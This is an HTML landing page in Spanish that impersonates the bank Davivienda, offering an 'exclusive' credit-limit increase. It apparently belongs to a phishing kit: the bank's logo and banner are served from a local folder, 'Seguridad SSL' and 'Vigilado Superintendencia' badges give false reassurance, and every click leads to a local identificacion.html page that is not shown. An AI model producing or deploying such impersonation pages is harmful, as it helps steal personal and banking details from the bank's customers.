<!DOCTYPE html>
<html lang="es">
<head>
 
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="./imagenes/unnamed.png?v=2">
    <title>Davivienda - Aumento de Cupo</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
        body {
            font-family: 'Open Sans', sans-serif;
        }
    </style>
</head>
<body class="bg-white flex flex-col min-h-screen">
    <div class="w-full max-w-md mx-auto px-6 pt-2 pb-10 flex flex-col items-center">
        <!-- Logo - margen inferior casi eliminado -->
        <div class="mb-0">
            <img src="./imagenes/Davivienda-Logo-EPS-vector-image.png" alt="Davivienda" class="w-[240px] object-contain">
        </div>

        <!-- Main Banner Image - EXTREMADAMENTE cerca del logo -->
        <div class="w-full mb-8 cursor-pointer -mt-1" onclick="window.location.href='identificacion.html'">
            <img src="./imagenes/banner_davivienda.jpg" alt="Solicita tu Tarjeta Davivienda" class="w-full rounded-2xl shadow-xl">
        </div>

        <!-- Heading Replacement -->
        <div class="text-center mb-8 px-2">
            <p class="text-[16px] text-[#666] leading-relaxed font-semibold">
                ¡Aproveche esta oportunidad exclusiva para usted!
            </p>
        </div>

        <!-- Action Button -->
        <div class="w-full mt-auto px-2">
            <button onclick="window.location.href='identificacion.html'" class="w-full h-[56px] bg-[#ED1C24] text-white font-bold text-[18px] rounded-full hover:bg-[#d11a20] transition-colors shadow-lg shadow-red-200 uppercase tracking-wide">
                Solicitar AHORA
            </button>
        </div>

        <!-- Trust Badge -->
        <div class="mt-8 flex items-center justify-center space-x-3 text-[#aaa]">
            <div class="flex items-center space-x-1">
                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
                <span class="text-[12px]">Seguridad SSL</span>
            </div>
            <span class="text-[#ddd]">|</span>
            <span class="text-[12px]">Vigilado Superintendencia</span>
        </div>

        <!-- Footer Divider -->
        <div class="w-full mt-10 pt-8 border-t border-[#f5f5f5]"></div>
    </div>
</body>
</html>
